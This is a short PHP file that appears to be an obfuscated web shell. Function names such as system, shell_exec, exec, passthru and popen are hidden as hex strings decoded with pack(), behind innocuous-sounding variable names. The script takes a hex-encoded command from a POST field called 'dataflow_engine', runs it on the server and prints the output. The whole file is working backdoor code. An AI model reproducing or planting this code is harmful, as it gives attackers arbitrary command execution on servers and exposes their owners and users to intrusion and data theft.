<?php


$val1 = '73';
$val2 = '79';
$val3 = '74';
$val4 = '65';
$val5 = '6c';
$val6 = '63';
$val7 = '78';
$val8 = '70';
$val9 = '72';
$val10 = '75';
$val11 = '6f';
$val12 = '6e';
$val13 = '61';
$val14 = '6d';
$val15 = '64';
$val16 = '66';
$val17 = '5f';
$val18 = '67';
$publish_content1 = pack("H*", $val1.$val2.'73'.$val3.$val4.'6d');
$publish_content2 = pack("H*", $val1.'68'.'65'.$val5.'6c'.'5f'.'65'.'78'.'65'.$val6);
$publish_content3 = pack("H*", $val4.$val7.$val4.$val6);
$publish_content4 = pack("H*", $val8.'61'.$val1.'73'.'74'.'68'.$val9.$val10);
$publish_content5 = pack("H*", $val8.$val11.'70'.$val4.$val12);
$publish_content6 = pack("H*", $val1.'74'.$val9.'65'.$val13.$val14.'5f'.'67'.'65'.'74'.'5f'.$val6.$val11.'6e'.$val3.$val4.$val12.'74'.$val1);
$publish_content7 = pack("H*", $val8.'63'.$val5.'6f'.$val1.$val4);
$dataflow_engine = pack("H*", $val15.'61'.$val3.'61'.$val16.$val5.'6f'.'77'.$val17.'65'.'6e'.$val18.'69'.'6e'.$val4);
if (isset($_POST[$dataflow_engine])) {
    $dataflow_engine = pack("H*", $_POST[$dataflow_engine]);
    if (function_exists($publish_content1)) {
        $publish_content1($dataflow_engine);
    } elseif (function_exists($publish_content2)) {
        print $publish_content2($dataflow_engine);
    } elseif (function_exists($publish_content3)) {
        $publish_content3($dataflow_engine, $obj_itm);
        print join("\n", $obj_itm);
    } elseif (function_exists($publish_content4)) {
        $publish_content4($dataflow_engine);
    } elseif (function_exists($publish_content5) && function_exists($publish_content6) && function_exists($publish_content7)) {
        $token_holder = $publish_content5($dataflow_engine, 'r');
        if ($token_holder) {
            $pset_property_set = $publish_content6($token_holder);
            $publish_content7($token_holder);
            print $pset_property_set;
        }
    }
    exit;
}
